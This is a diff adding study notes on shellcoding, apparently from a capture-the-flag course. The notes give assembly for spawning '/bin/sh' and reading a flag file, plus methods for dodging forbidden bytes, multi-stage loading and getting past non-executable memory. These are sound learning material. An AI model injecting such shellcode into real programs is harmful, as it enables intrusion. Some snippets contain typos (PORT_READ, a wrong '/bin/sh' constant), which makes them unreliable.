@@ -268,6 +268,129 @@ stdin, stdout, and stderr are 0, 1, and 2
                 // return value: rax
                 // callee saved: rbx, rbp, r12, r13, r14, r15
 
+// ----Shellcoding----
+// Introducation
+    // Von Neumann architechture: sees and stores code as data
+
+    // Shell coding
+    // goal is to achieve arbitrary command Execution
+    // attack goal is to launch a shell 
+        // execve('/bin/sh', 0, 0)
+        // -----------------------
+        // mov rax, 59
+        // lea rdi, [rip+binsh]
+        // mov rsi, 0
+        // mov rdx, 0
+        // syscall 
+        // binsh:
+        // .string "/bin/sh" <- add this data into your shell code
+
+    // Adding data
+        // .string "some string" -> "some string\0"
+        // .byte 0x??, 0x?? ...
+        // also
+        // mov rbx, 0x006748327b # move '/bin/sh\0' into rbx
+        // push rbx              # push '/bin/sh\0' onto the stack
+        // mov rdi, rsp          # point rdi at the stack
+
+        // Non-shell shellcode: sendfile(1, open("/flag", NULL), 0, 1000)
+        // mov rbx, addr of /flag 
+        // push rbx 
+        // mov rax, 2 -> syscall 2 open() 
+        // mov rdi, rsp
+        // mov rsi, 0
+        // syscall -> call open()
+
+        // mov rdi, 1
+        // mov rsi, rax -> rax is return value of open() 
+        // mov rdx, 0
+        // mov r10, 1000
+        // mov rax, 40 -> sendfile() is syscall 40
+        // syscall -> call sendfile()
+
+        // mov rax, 60 -> exit() is sysclal 60
+        // syscall -> call exit()
+
+    // Building shellcode
+        // 1. write shellcode in Assembly
+        // 2. assemble the code
+        // 3. extract shell code in bytes from .text
+        // 4. these bytes is what you will inject
+
+    // Running shellcode in exotic conditions
+        // page = mmap(0x1337000, 0x1000, PORT_READ|PORT_WRITE|PORT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+        // read(0, page, 0x1000);
+        // ((void(*)())page)();
+        // then 'cat shellcode | ./tester'
+
+    // Debug shellcode 
+        // highlevel: strace
+        // lowlevel: gdb
+            // print next 5 instructions: x/5i $rip 
+            // examine qwords(x/gx $rsp), dwords(x/2dx $rsp), halfwords(x/4hx, $rsp), bytes(x/8b $rsp)
+            // to step one instr (follow call instr): si 
+            // to step one instr (step over call instr): ni
+            // to break at an addr: break *0xaddr
+            // run, continue, and reverse exection work as expected
+            // hardcode breakpoints in your code using int3 instruction -> best to use at the beginning of the shellcode
+
+// Common Challenges 
+    // Forbidden Bytes
+        // Bytes (Hex Value)         | Problematic methods
+        // Null byte \0 (0x00)       | strcpy
+        // Newline \n (0x0a)         | scanf, gets, getline, fgets
+        // carriage return \r (0x0d) | scanf
+        // space (0x20)              | scanf
+        // tab \t (0x09)             | scanf 
+        // DEL (0x7f)                | protocol-specific (telnet, VT100, etc)
+       
+        // Bad                   | Good
+        // mov rax, 0            | xor rax, rax
+        // mov rax, 5            | xor rax, rax; mov al, 5
+        // mov rax, 10           | mov rax, 9; inc rax 
+        // mov rbx, 0x67616c662f | mov ebx, 0x67616c66; shl rbx, 8; mov bl, 0x2f
+        //          ("flag")^^^^
+
+        // Bypassing restriction on int3 
+            // inc byte ptr [rip] <- increments next instruction
+            // .byte 0xcb
+            // testing: gcc -Wl, -N --static -nostdlib -o test test.s
+
+    // Multi Stage shellcode 
+        // Stage 1: read(0, rip, 1000)
+            // get currect instruction pointer -> lea rax, [rip]
+        // Stage 2: whatever you want! -> stage 1 reads in this shell code
+
+    // Shellcode Mangling 
+        // Examples: shellcode can be: 
+            // sorted
+            // compressed or uncompressed
+            // encrypted or decrypted
+        // Tips: construct the shellcode backwards
+            // write shellcode so it will end how you want it
+
+    // Communication: 
+        // Normal shellcode gives you a shell (or the flag)
+        // if there is no output (e.g. close(1) or close(2))
+        // one bit of data is enough to communicate
+
+// Data Execution Prevention
+// Shellcode MItigation    
+    // PROT_READ: allows process to read memory
+    // PROT_WRITE: allows process to write memory
+    // PROT_EXEC: allows process to execute memory 
+    // in modern systems the STACK and HEAP are not executable
+    // PROBLEM: your shellcode needs to execute
+
+// End of shellcoding ?
+    // Still very prevalant in embedded systems
+    // use the mprotect() system call to make memory executable
+    // can also jump to the shellcode 
+    // JIT: Just in time compilers 
+        // generating binary code that is able to be ran
+        // JIT spraying: place constants in code to use mprotect()
+    
+
 
     
         
